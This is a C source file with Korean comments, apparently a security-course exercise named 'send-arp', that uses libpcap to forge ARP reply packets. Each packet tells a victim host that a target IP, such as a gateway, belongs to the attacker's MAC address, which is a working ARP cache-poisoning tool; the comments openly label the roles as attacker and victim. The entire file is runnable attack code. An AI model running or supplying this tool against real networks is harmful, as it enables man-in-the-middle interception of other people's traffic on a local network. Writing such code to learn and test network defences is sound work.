#include <stdio.h>       
#include <pcap.h>        
#include <string.h>      
#include <arpa/inet.h>   
#include <net/if.h>      
#include <sys/ioctl.h>   
#include <unistd.h>      
#include <stdlib.h>      

#pragma pack(push, 1)    // 구조체 멤버들을 1바이트 단위로 정렬(패딩 없이 연속적으로 저장)하도록 지정

// 이더넷 헤더 구조체
typedef struct {
    uint8_t dmac[6];     // 목적지 MAC 주소
    uint8_t smac[6];     // 출발지 MAC 주소
    uint16_t type;       // 이더넷 타입 (ARP 패킷은 0x0806)
} EthHdr;

// ARP 헤더 구조체
typedef struct {
    uint16_t hrd;        // 하드웨어 타입 (이더넷은 1)
    uint16_t pro;        // 프로토콜 타입 (IPv4는 0x0800)
    uint8_t hln;         // 하드웨어 주소 길이 (MAC 주소는 6바이트)
    uint8_t pln;         // 프로토콜 주소 길이 (IPv4 주소는 4바이트)
    uint16_t op;         // ARP 오퍼레이션 코드 (요청은 1, 응답은 2)
    uint8_t smac[6];     // 송신자 MAC 주소
    uint32_t sip;        // 송신자 IP 주소
    uint8_t tmac[6];     // 대상 MAC 주소
    uint32_t tip;        // 대상 IP 주소
} ArpHdr;

// 이더넷 헤더와 ARP 헤더를 포함한 패킷 구조체
typedef struct {
    EthHdr eth;          // 이더넷 헤더
    ArpHdr arp;          // ARP 헤더
} EthArpPacket;

#pragma pack(pop)        // 구조체 멤버 정렬을 원래대로 복원

// 프로그램 사용법을 출력하는 함수
void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// 지정된 네트워크 인터페이스의 MAC 주소를 가져오는 함수
void get_mac_address(const char* interface, uint8_t* mac) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
    if (sockfd < 0) {                            // 소켓 생성 실패 시 에러 처리
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);  // 인터페이스 이름 복사
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) { // MAC 주소 요청
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    close(sockfd);                               // 소켓 닫기
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);      // 가져온 MAC 주소를 mac 배열에 복사
}

// ARP 패킷을 구성하는 함수
void create_arp_packet(EthArpPacket* packet, const uint8_t* attacker_mac, uint32_t sender_ip, uint32_t target_ip) {
    // 이더넷 헤더 설정
    memset(packet->eth.dmac, 0xFF, 6);          // 목적지 MAC 주소를 브로드캐스트로 설정
    memcpy(packet->eth.smac, attacker_mac, 6);  // 출발지 MAC 주소를 공격자의 MAC 주소로 설정
    packet->eth.type = htons(0x0806);           // 이더넷 타입을 ARP로 설정

    // ARP 헤더 설정
    packet->arp.hrd = htons(1);                 // 하드웨어 타입을 이더넷으로 설정
    packet->arp.pro = htons(0x0800);            // 프로토콜 타입을 IPv4로 설정
    packet->arp.hln = 6;                        // 하드웨어 주소 길이를 6바이트로 설정
    packet->arp.pln = 4;                        // 프로토콜 주소 길이를 4바이트로 설정
    packet->arp.op = htons(2);                  // ARP 오퍼레이션을 응답(Reply)으로 설정
    memcpy(packet->arp.smac, attacker_mac, 6);  // 송신자 MAC 주소를 공격자의 MAC 주소로 설정
    packet->arp.sip = target_ip;                // 송신자 IP 주소를 타겟 IP로 설정 (타겟이 피해자에게 응답하는 것처럼 보이게 함)
    memcpy(packet->arp.tmac, attacker_mac, 6);  // 대상 MAC 주소를 공격자의 MAC 주소로 설정
    packet->arp.tip = sender_ip;                // 대상 IP 주소를 송신자 IP로 설정 (피해자의 IP)
}

// ARP 패킷을 전송하는 함수
void send_arp_packet(pcap_t* handle, const EthArpPacket* packet) {
    // 패킷을 전송하고, 오류가 발생하면 메시지를 출력
    if (pcap_sendpacket(handle, (const u_char*)packet, sizeof(EthArpPacket)) != 0) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
    }
}

// 프로그램의 메인 함수
int main(int argc, char* argv[]) {
    // 명령어 인자가 부족하거나 잘못된 경우 사용법을 출력
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    const char* dev = argv[1]; // 네트워크 인터페이스 이름
    char errbuf[PCAP_ERRBUF_SIZE];
    // 패킷 캡처를 위한 핸들을 열기
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) { // 핸들 열기에 실패한 경우 에러 메시지를 출력
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    uint8_t attacker_mac[6];   // 공격자의 MAC 주소를 저장할 배열
    get_mac_address(dev, attacker_mac); // 네트워크 인터페이스의 MAC 주소를 가져옴

    // 모든 (sender_ip, target_ip) 쌍에 대해 반복
    for (int i = 2; i < argc; i += 2) {
        uint32_t sender_ip = inet_addr(argv[i]);       // 송신자 IP 주소를 정수형으로 변환
        uint32_t target_ip = inet_addr(argv[i + 1]);   // 타겟 IP 주소를 정수형으로 변환

        EthArpPacket packet;    // ARP 패킷 구조체 생성 및 초기화
        memset(&packet, 0, sizeof(packet)); // 패킷을 0으로 초기화

        create_arp_packet(&packet, attacker_mac, sender_ip, target_ip); // ARP 패킷 생성
        send_arp_packet(handle, &packet); // ARP 패킷을 네트워크로 전송
    }

    pcap_close(handle); // 패킷 캡처 핸들 닫기
    return 0; // 프로그램 종료
}

